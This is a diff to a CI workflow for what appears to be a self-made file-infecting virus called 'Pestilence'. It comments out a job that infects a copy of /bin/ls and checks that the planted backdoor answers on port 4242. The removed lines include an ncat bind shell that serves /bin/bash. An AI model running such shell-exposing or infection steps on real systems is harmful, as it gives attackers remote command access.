@@ -257,39 +257,36 @@ jobs:
     - name: Check infected ls output
       run: ls /tmp/test -al > ls_expected && diff ls_output ls_expected
 
-  backdoor_test:
-    name: Test backdoor
-    runs-on: ubuntu-24.04
-    needs: build
+  # backdoor_test:
+  #   name: Test backdoor
+  #   runs-on: ubuntu-24.04
+  #   needs: build
 
-    steps:
-    - name: Install ncat
-      run: sudo apt-get update && sudo apt-get install -y ncat
+  #   steps:
+  #   - name: Install ncat
+  #     run: sudo apt-get update && sudo apt-get install -y ncat
 
-    - name: test
-      run: ncat -l -p 4242 -e /bin/bash & && echo "id" | nc -v -q 1 localhost 4242
+  #   - uses: actions/download-artifact@v4
+  #     with:
+  #       name: Pestilence
 
-    - uses: actions/download-artifact@v4
-      with:
-        name: Pestilence
+  #   - name: Make pestilence executable
+  #     run: chmod +x ./Pestilence
 
-    - name: Make pestilence executable
-      run: chmod +x ./Pestilence
+  #   - name: Prepare test
+  #     run: mkdir -p /tmp/test && cp /bin/ls /tmp/test/ls
 
-    - name: Prepare test
-      run: mkdir -p /tmp/test && cp /bin/ls /tmp/test/ls
+  #   - name: Infect ls
+  #     run: ./Pestilence
 
-    - name: Infect ls
-      run: ./Pestilence
+  #   - name: Connect to ls backdoor
+  #     run: /tmp/test/ls > /dev/null && echo "id" | nc -v -q 1 localhost 4242 > backdoor_output
 
-    - name: Connect to ls backdoor
-      run: /tmp/test/ls > /dev/null && echo "id" | nc -v -q 1 localhost 4242 > backdoor_output
+  #   - name: Upload backdoor output
+  #     uses: actions/upload-artifact@v4
+  #     with:
+  #       name: backdoor_test-backdoor_output.txt
+  #       path: ./backdoor_output
 
-    - name: Upload backdoor output
-      uses: actions/upload-artifact@v4
-      with:
-        name: backdoor_test-backdoor_output.txt
-        path: ./backdoor_output
-
-    - name: Check backdoor output
-      run: id > backdoor_output_expected && diff backdoor_output backdoor_output_expected
+  #   - name: Check backdoor output
+  #     run: id > backdoor_output_expected && diff backdoor_output backdoor_output_expected
